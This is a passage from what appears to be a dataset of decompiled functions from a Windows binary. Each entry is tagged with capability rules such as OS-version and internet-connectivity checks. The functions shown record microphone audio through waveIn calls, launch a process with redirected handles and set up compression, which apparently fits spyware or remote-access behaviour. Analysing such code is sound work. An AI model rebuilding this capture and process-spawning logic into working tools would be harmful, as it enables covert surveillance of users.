        "decompiled_code": "\nuint __cdecl fcn.00466810(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint lpWndClass;\n    code *var_24h;\n    \n    *0x493ad8 = *0x4987f8;\n    iVar1 = sub.user32.dll_GetClassInfoA(*0x4987f8, *0x493aec, &lpWndClass);\n    if ((iVar1 == 0) || (var_24h != sub.user32.dll_DefWindowProcA)) {\n        if (iVar1 != 0) {\n            sub.user32.dll_UnregisterClassA(*0x493aec, *0x4987f8);\n        }\n        sub.user32.dll_RegisterClassA(0x493ac8);\n    }\n    uVar2 = fcn.00408584(0, *0x4987f8, 0, 0, 0, 0, 0, 0, 0x80000000);\n    if (arg_8h._2_2_ != 0) {\n        uVar3 = fcn.00466764(arg_8h, arg_ch);\n        sub.user32.dll_SetWindowLongA(uVar2, 0xfffffffc, uVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 294
    },
    "0046695c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046695c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack44;\n    int32_t iStack40;\n    uchar *puStack36;\n    uint uStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 4) == '\\0') {\n        uStack24 = 0x466a7d;\n        fcn.00466c30();\n    }\n    else {\n        uStack24 = 0x20;\n        uStack32 = *(in_EAX + 0x94);\n        puStack36 = 0x46698b;\n        iStack28 = param_2;\n        iVar1 = sub.winmm.dll_waveInUnprepareHeader();\n        if (iVar1 == 0) {\n            uVar2 = *(param_2 + 8);\n            if (*(in_EAX + 0xa2) != 0) {\n                puStack36 = 0x4669ad;\n                fcn.00402f00();\n                iStack40 = 0x4669f9;\n                uStack44 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd4;\n                puStack36 = &stack0xfffffffc;\n                fcn.004030fc();\n                (**(in_EAX + 0xa0))();\n                *in_FS_OFFSET = uVar2;\n                iStack40 = 0x466a00;\n                uStack44 = 0x4669f8;\n                fcn.00402f1c();\n                return;\n            }\n            *(param_2 + 4) = *(in_EAX + 0xc);\n            *(param_2 + 8) = 0;\n            *(param_2 + 0xc) = 0;\n            *(param_2 + 0x10) = 0;\n            *(param_2 + 0x14) = 0;\n            puStack36 = 0x466a3e;\n            fcn.00408570();\n            puStack36 = 0x20;\n            uStack44 = *(in_EAX + 0x94);\n            iStack40 = param_2;\n            iVar1 = sub.winmm.dll_waveInPrepareHeader();\n            if (iVar1 == 0) {\n                sub.winmm.dll_waveInAddBuffer(*(in_EAX + 0x94), param_2, 0x20);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 586
    },
    "00466a84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466a84(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t aiStack172 [3];\n    uchar *puStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint auStack144 [33];\n    \n    puVar3 = &stack0xffffff70;\n    for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *param_2;\n        param_2 = param_2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = *param_2;\n    if (*(in_EAX + 4) == '\\0') {\n        uStack148 = 0x10004;\n        uStack152 = 0;\n        uStack156 = *(in_EAX + 0x98);\n        puStack160 = &stack0xffffff70;\n        aiStack172[2] = 0;\n        aiStack172[1] = in_EAX + 0x94;\n        aiStack172[0] = 0x466ac3;\n        iVar1 = sub.winmm.dll_waveInOpen();\n        if (iVar1 == 0) {\n            for (uVar2 = *(in_EAX + 0x91); uVar2 != 0; uVar2 = uVar2 - 1) {\n                aiStack172[0] = 0x466ad9;\n                fcn.00466bc8();\n            }\n            aiStack172[0] = *(in_EAX + 0x94);\n            iVar1 = sub.winmm.dll_waveInStart();\n            if (iVar1 == 0) {\n                puVar3 = &stack0xffffff54;\n                puVar4 = in_EAX + 0x10;\n                for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                *puVar4 = *puVar3;\n                *(in_EAX + 4) = 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 540
    },
    "00466b64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00466b64(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 4) != '\\0') {\n        *(in_EAX + 4) = 0;\n        sub.winmm.dll_waveInReset(*(in_EAX + 0x94));\n        sub.winmm.dll_waveInClose(*(in_EAX + 0x94));\n        *(in_EAX + 0x94) = 0;\n        iVar1 = *(*(in_EAX + 8) + 8) + -1;\n        if (-1 < iVar1) {\n            do {\n                fcn.004661f4();\n                fcn.00466c30();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00466bbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466bbc(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) == '\\0') {\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "00466cd4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00466cd4(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack928;\n    uint uStack924;\n    uchar *puStack920;\n    uint lpSecurityAttributes;\n    uint var_380h;\n    uint var_37ch;\n    int32_t hHandle;\n    int32_t var_374h;\n    uint var_368h;\n    uint var_33ch;\n    uint var_338h;\n    int32_t var_330h;\n    int32_t var_32ch;\n    uint var_323h;\n    uint lpFileName;\n    uint var_119h;\n    int32_t hObject;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    puStack920 = 0x466ced;\n    cVar1 = fcn.0040a274();\n    if (cVar1 == '\\0') {\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack920 = 0x466d07;\n        fcn.0040a930();\n        puStack920 = 0x466d14;\n        fcn.0040a930();\n        puStack920 = 0x466d21;\n        fcn.0040a930();\n        uStack924 = 0x466ec3;\n        iStack928 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffc60;\n        puStack920 = &fcn.00466cd4::var_1h + 1;\n        fcn.00403af4();\n        lpSecurityAttributes = 0xc;\n        var_380h = 0;\n        var_37ch = 0xffffffff;\n        var_10h = sub.kernel32.dll_CreateFileA_1\n                            (&fcn.00466cd4::lpFileName, 0xc0000000, 3, &fcn.00466cd4::lpSecurityAttributes, 4, 0x100, 0)\n        ;\n        if (var_10h == -1) {\n            var_1h._0_1_ = 0;\n            fcn.00404f70();\n        }\n        else {\n            hObject = sub.kernel32.dll_CreateFileA_1\n                                (&fcn.00466cd4::var_323h, 0xc0000000, 3, &fcn.00466cd4::lpSecurityAttributes, 2, 0x100, \n                                 0);\n            if (hObject == -1) {\n                var_1h._0_1_ = 0;\n                fcn.00404f70();\n            }\n            else {\n                fcn.00403af4();\n                var_368h = 0x44;\n                var_33ch = 0x101;\n                var_338h._0_2_ = 0;\n                var_32ch = hObject;\n                var_330h = var_10h;\n                iVar2 = sub.kernel32.dll_CreateProcessA\n                                  (0, &fcn.00466cd4::var_119h, 0, 0, 0xffffffff, 0x110, 0, 0, &fcn.00466cd4::var_368h, \n                                   &fcn.00466cd4::hHandle);\n                var_1h._0_1_ = '\\x01' - (iVar2 == 0);\n                if (var_1h != '\\0') {\n                    iVar2 = hHandle;\n                    sub.kernel32.dll_WaitForSingleObject(hHandle, 0xffffffff);\n                    var_8h = hHandle;\n                    var_ch = var_374h;\n                    uVar3 = 0;\n                    *in_FS_OFFSET = iVar2;\n                    if (hObject != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(hObject, 0x466eca);\n                    }\n                    if (var_10h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_10h);\n                    }\n                    if (var_ch != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_ch);\n                    }\n                    if (var_8h != 0) {\n                        uVar3 = sub.kernel32.dll_CloseHandle_1(var_8h);\n                    }\n                    return uVar3;\n                }\n                var_1h._0_1_ = 0;\n                fcn.00404f70();\n            }\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 1041
    },
    "00466f74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.00466f74(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uchar *var_68h;\n    uint *var_64h;\n    uint32_t var_60h;\n    uint *var_5ch;\n    uint *var_58h;\n    uint *var_54h;\n    uint *var_50h;\n    uint *var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint *var_40h;\n    uint32_t var_3ch;\n    uint *var_38h;\n    uint32_t var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    iVar3 = 0xd;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x466f93;\n    var_14h = unaff_EDI;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    var_4h = in_EAX;\n    fcn.004059cc();\n    var_1ch = 0x467507;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00466f74::var_20h;\n    if (var_4h != 0) {\n        var_24h = *0x467518;\n        var_28h = &fcn.00466f74::var_2ch;\n        var_2ch = 0x466fc9;\n        var_18h = &stack0xfffffffc;\n        fcn.0040ef4c(var_28h, var_24h);\n        var_2ch = 0x466fd4;\n        fcn.004055c8();\n        var_2ch = *0x467518;\n        var_30h = &fcn.00466f74::var_30h;\n        var_34h = 0x466ff2;\n        fcn.0040ef4c(var_30h, var_2ch);\n        var_34h = 0x466ffd;\n        fcn.004055c8();\n        var_34h = 0x467009;\n        piVar2 = fcn.00404620();\n        var_34h = 0x467015;\n        (**(*piVar2 + 0x90))();\n        var_34h = 0x46701f;\n        (**(*piVar2 + 0x2c))();\n        var_34h = 0x467028;\n        (**(*piVar2 + 0x48))();\n        var_34h = 0x467031;\n        (**(*piVar2 + 0x48))();\n        var_34h = 0x46703a;\n        (**(*piVar2 + 0x48))();\n        var_34h = 0x467043;\n        (**(*piVar2 + 0x48))();\n        do {\n            var_24h = 0x46704f;\n            (**(*piVar2 + 0xc))();\n            var_24h = 0x46705a;\n            fcn.00409b84();\n            var_24h = 0x467065;\n            fcn.004055c8();\n            var_24h = &fcn.00466f74::var_8h;\n            var_28h = 0x467076;\n            fcn.00405b28();\n            var_28h = 0x467086;\n            fcn.00405a44();\n            var_28h = 0x467093;\n            fcn.00405b28();\n            var_28h = 0x4670a2;\n            fcn.00405a84();\n            var_28h = 0x4670ad;\n            fcn.00409b84();\n            var_28h = 0x4670b8;\n            fcn.004055c8();\n            var_28h = &fcn.00466f74::var_ch;\n            var_2ch = 0x4670c9;\n            fcn.00405b28();\n            var_2ch = 0x4670d9;\n            fcn.00405a44();\n            var_2ch = 0x4670e6;\n            fcn.00405b28();\n            var_2ch = 0x4670f5;\n            fcn.00405a84();\n            var_2ch = 0x467100;\n            fcn.00409b84();\n            var_2ch = 0x46710b;\n            fcn.004055c8();\n            var_2ch = &fcn.00466f74::var_10h;\n            var_30h = 0x46711c;\n            fcn.00405b28();\n            var_30h = 0x46712c;\n            fcn.00405a44();\n            var_30h = 0x467139;\n            fcn.00405b28();\n            var_30h = 0x467148;\n            fcn.00405a84();\n            var_30h = 0x467153;\n            fcn.00409b84();\n            var_30h = 0x46715e;\n            fcn.004055c8();\n            var_30h = &fcn.00466f74::var_14h;\n            var_34h = 0x46716f;\n            fcn.00405b28();\n            var_34h = 0x46717f;\n            fcn.00405a44();\n            var_34h = 0x46718c;\n            fcn.00405b28();\n            var_34h = 0x46719b;\n            fcn.00405a84();\n            var_34h = 0x4671a6;\n            fcn.00409b84();\n            var_34h = 0x4671ae;\n            fcn.00409ee4();\n            var_34h = 0x4671b6;\n            fcn.00466c64();\n            var_34h = 0x4671c3;\n            cVar1 = fcn.00466ed8();\n            if (cVar1 == '\\x01') {\n                var_34h = *0x46756c;\n                var_38h = &fcn.00466f74::var_44h;\n                var_3ch = 0x4671e5;\n                fcn.0040ef4c(var_38h, var_34h);\n                var_3ch = 0x4671f0;\n                fcn.004055c8();\n                var_3ch = *0x46756c;\n                var_40h = &fcn.00466f74::var_48h;\n                var_44h = 0x46720e;\n                fcn.0040ef4c(var_40h, var_3ch);\n                var_44h = 0x467219;\n                fcn.004055c8();\n                var_44h = *0x46756c;\n                var_48h = &fcn.00466f74::var_4ch;\n                var_4ch = 0x467237;\n                fcn.0040ef4c(var_48h, var_44h);\n                var_4ch = 0x467242;\n                fcn.004055c8();\n            }\n            var_4ch = &fcn.00466f74::var_18h;\n            var_50h = 0x467253;\n            fcn.00405b28();\n            var_50h = 0x467263;\n            fcn.00405a44();\n            var_50h = 0x467270;\n            fcn.00405b28();\n            var_50h = 0x46727f;\n            fcn.00405a84();\n            var_50h = 0x467288;\n            (**(*piVar2 + 0x48))();\n            var_50h = 0x467293;\n            fcn.00409b84();\n            if (var_50h == NULL) {\n                var_50h = 0x4672aa;\n                cVar1 = fcn.00466ed8();\n                if (cVar1 == '\\x01') {\n                    var_50h = *0x46756c;\n                    var_54h = &fcn.00466f74::var_54h;\n                    var_58h = 0x4672cc;\n                    fcn.0040ef4c(var_54h, var_50h);\n                    var_58h = 0x4672d7;\n                    fcn.004055c8();\n                    var_58h = *0x46756c;\n                    var_5ch = &fcn.00466f74::var_58h;\n                    var_60h = 0x4672f5;\n                    fcn.0040ef4c(var_5ch, var_58h);\n                    var_60h = 0x467300;\n                    fcn.004055c8();\n                    var_60h = *0x46756c;\n                    var_64h = &fcn.00466f74::var_5ch;\n                    var_68h = 0x46731e;\n                    fcn.0040ef4c(var_64h, var_60h);\n                    var_68h = 0x467329;\n                    fcn.004055c8();\n                }\n                var_50h = 0x467336;\n                fcn.004055c8();\n                var_50h = &fcn.00466f74::var_1ch;\n                var_54h = 0x467347;\n                fcn.00405b28();\n                var_54h = 0x467357;\n                fcn.00405a44();\n                var_54h = 0x467364;\n                fcn.00405b28();\n                var_54h = 0x467373;\n                fcn.00405a84();\n                var_54h = *param_2;\n                var_58h = var_24h;\n                var_5ch = 0x46759c;\n                var_60h = var_8h;\n                var_64h = 0x46759c;\n                var_68h = var_18h;\n                fcn.004058e0(0x4675a8, var_20h, 0x46759c, var_10h, 0x46759c, var_14h, 0x46759c, var_1ch, 0x46759c, \n                             var_ch, 0x46759c);\n            }\n            else {\n                var_50h = 0x4673d3;\n                cVar1 = fcn.00466ed8();\n                if (cVar1 == '\\x01') {\n                    var_50h = *0x46756c;\n                    var_54h = &fcn.00466f74::var_60h;\n                    var_58h = 0x4673f5;\n                    fcn.0040ef4c(var_54h, var_50h);\n                    var_58h = 0x467400;\n                    fcn.004055c8();\n                    var_58h = *0x46756c;\n                    var_5ch = &fcn.00466f74::var_64h;\n                    var_60h = 0x46741e;\n                    fcn.0040ef4c(var_5ch, var_58h);\n                    var_60h = 0x467429;\n                    fcn.004055c8();\n                    var_60h = *0x46756c;\n                    var_64h = &fcn.00466f74::var_68h;\n                    var_68h = 0x467447;\n                    fcn.0040ef4c(var_64h, var_60h);\n                    var_68h = 0x467452;\n                    fcn.004055c8();\n                }\n                var_50h = &fcn.00466f74::var_1ch;\n                var_54h = 0x467463;\n                fcn.00405b28();\n                var_54h = 0x467473;\n                fcn.00405a44();\n                var_54h = 0x467480;\n                fcn.00405b28();\n                var_54h = 0x46748f;\n                fcn.00405a84();\n                var_54h = *param_2;\n                var_58h = var_24h;\n                var_5ch = 0x46759c;\n                var_60h = var_8h;\n                var_64h = 0x46759c;\n                var_68h = var_18h;\n                fcn.004058e0(0x4675a8, var_20h, 0x46759c, var_14h, 0x46759c, var_10h, 0x46759c, var_1ch, 0x46759c, \n                             var_ch, 0x46759c);\n            }\n            iVar3 = (**(*piVar2 + 0x14))();\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x46750e;\n    var_1ch = 0x467506;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 3450
    },
    "004676a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004676a0(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_stack_0000eff0;\n    \n    iVar1 = 0x10;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00403af4();\n    fcn.0046766c();\n    fcn.0046769c();\n    iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    while (0 < iVar1) {\n        do {\n            fcn.004681c8();\n            fcn.0046769c();\n            (**(*param_2 + 0x10))();\n        } while (iVar1 != 0);\n        iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    }\n    do {\n        fcn.004681c8();\n        iVar1 = fcn.0046769c();\n        (**(*param_2 + 0x10))();\n    } while (iVar1 != 1);\n    fcn.0046848c();\n    fcn.0046769c();\n    return;\n}\n",
        "token_count": 267
    },
    "004677d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004677d8(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_stack_0000eff0;\n    \n    iVar1 = 0x10;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00403af4();\n    fcn.00467684();\n    fcn.0046769c();\n    iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    while (0 < iVar1) {\n        do {\n            fcn.00469b18();\n            fcn.0046769c();\n            (**(*param_2 + 0x10))();\n        } while (iVar1 != 0);\n        iVar1 = (**(*in_stack_0000eff0 + 0xc))();\n    }\n    do {\n        fcn.00469b18();\n        iVar1 = fcn.0046769c();\n        (**(*param_2 + 0x10))();\n    } while (iVar1 != 1);\n    fcn.0046a9d4();\n    fcn.0046769c();\n    return;\n}\n",
        "token_count": 268
    },
    "00467c28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00467c28(int32_t arg_8h, char *arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar3;\n    bool bVar4;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (((arg_ch == NULL) || (*arg_ch != *0x493b98)) || (arg_8h != 0x38)) {\n        uVar1 = 0xfffffffa;\n    }\n    else if (in_EAX == 0) {\n        uVar1 = 0xfffffffe;\n    }\n    else {\n        *(in_EAX + 0x18) = 0;\n        if (*(in_EAX + 0x20) == 0) {\n            *(in_EAX + 0x20) = 0x467630;\n            *(in_EAX + 0x28) = 0;\n        }\n        if (*(in_EAX + 0x24) == 0) {\n            *(in_EAX + 0x24) = 0x46763c;\n        }\n        var_4h = in_EDX;\n        if (in_EDX == -1) {\n            var_4h = 6;\n        }\n        bVar4 = arg_18h < 0;\n        if (bVar4) {\n            arg_18h = -arg_18h;\n        }\n        var_ch = !bVar4;\n        if (((((arg_14h < 1) || (9 < arg_14h)) || ((in_ECX != 8 || ((arg_18h < 8 || (0xf < arg_18h)))))) || (var_4h < 0)\n            ) || (((9 < var_4h || (arg_10h < 0)) || (4 < arg_10h)))) {\n            uVar1 = 0xfffffffe;\n        }\n        else {\n            if (arg_18h == 8) {\n                arg_18h = 9;\n            }\n            piVar2 = (**(in_EAX + 0x20))();\n            if (piVar2 == NULL) {\n                uVar1 = 0xfffffffc;\n            }\n            else {\n                *(in_EAX + 0x1c) = piVar2;\n                *piVar2 = in_EAX;\n                piVar2[6] = var_ch;\n                piVar2[0xb] = arg_18h;\n                iVar3 = 1 << (arg_18h & 0x1f);\n                piVar2[10] = iVar3;\n                piVar2[0xc] = iVar3 + -1;\n                piVar2[0x13] = arg_14h + 7;\n                iVar3 = 1 << (arg_14h + 7 & 0x1f);\n                piVar2[0x12] = iVar3;\n                piVar2[0x14] = iVar3 + -1;\n                piVar2[0x15] = (piVar2[0x13] + 2U) / 3;\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[0xd] = iVar3;\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[0xf] = iVar3;\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[0x10] = iVar3;\n                piVar2[0x5a6] = 1 << (arg_14h + 6U & 0x1f);\n                iVar3 = (**(in_EAX + 0x20))();\n                piVar2[2] = iVar3;\n                piVar2[3] = piVar2[0x5a6] << 2;\n                if (((piVar2[0xd] == 0) || (piVar2[0xf] == 0)) || ((piVar2[0x10] == 0 || (piVar2[2] == 0)))) {\n                    piVar2[1] = 0x29a;\n                    *(in_EAX + 0x18) = *0x493b0c;\n                    fcn.0046848c();\n                    uVar1 = 0xfffffffc;\n                }\n                else {\n                    piVar2[0x5a8] = iVar3 + (piVar2[0x5a6] & 0xfffffffeU);\n                    piVar2[0x5a5] = piVar2[0x5a6] * 3 + piVar2[2];\n                    piVar2[0x20] = var_4h;\n                    piVar2[0x21] = arg_10h;\n                    *(piVar2 + 8) = 8;\n                    uVar1 = fcn.00467f44();\n                }\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 1153
    },
    "00467f44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00467f44(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((((in_EAX != 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x20) != 0)) && (*(in_EAX + 0x24) != 0)) {\n        *(in_EAX + 0x14) = 0;\n        *(in_EAX + 8) = 0;\n        *(in_EAX + 0x18) = 0;\n        *(in_EAX + 0x2c) = 2;\n        iVar1 = *(in_EAX + 0x1c);\n        *(iVar1 + 0x14) = 0;\n        *(iVar1 + 0x10) = *(iVar1 + 8);\n        if (*(iVar1 + 0x18) < 0) {\n            *(iVar1 + 0x18) = -*(iVar1 + 0x18);\n        }\n        if (*(iVar1 + 0x18) == 0) {\n            uVar2 = 0x71;\n        }\n        else {\n            uVar2 = 0x2a;\n        }\n        *(iVar1 + 4) = uVar2;\n        uVar2 = fcn.00467904();\n        *(in_EAX + 0x30) = uVar2;\n        *(iVar1 + 0x24) = 0;\n        fcn.0046b1b8();\n        fcn.00468724();\n        return 0;\n    }\n    return 0xfffffffe;\n}\n",
        "token_count": 369
    },
    "004680d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004680d4(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint in_ECX;\n    uint in_EDX;\n    \n    if ((in_EAX == 0) || (*(in_EAX + 0x1c) == 0)) {\n        uVar2 = 0xfffffffe;\n    }\n    else {\n        iVar1 = *(in_EAX + 0x1c);\n        *(iVar1 + 0x88) = in_EDX;\n        *(iVar1 + 0x7c) = in_ECX;\n        *(iVar1 + 0x8c) = arg_ch;\n        *(iVar1 + 0x78) = arg_8h;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 192
    },
    "00468174": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00468174(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint32_t arg_10h;\n    \n    arg_10h = *(*(in_EAX + 0x1c) + 0x14);\n    if (*(in_EAX + 0x10) < arg_10h) {\n        arg_10h = *(in_EAX + 0x10);\n    }\n    if (arg_10h != 0) {\n        fcn.00467658(*(in_EAX + 0xc), *(*(in_EAX + 0x1c) + 0x10), arg_10h);\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + arg_10h;\n        piVar1 = *(in_EAX + 0x1c) + 0x10;\n        *piVar1 = *piVar1 + arg_10h;\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + arg_10h;\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) - arg_10h;\n        piVar1 = *(in_EAX + 0x1c) + 0x14;\n        *piVar1 = *piVar1 - arg_10h;\n        iVar2 = *(in_EAX + 0x1c);\n        if (*(iVar2 + 0x14) == 0) {\n            *(iVar2 + 0x10) = *(iVar2 + 8);\n        }\n    }\n    return;\n}\n",
        "token_count": 372
    },
    "004681c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
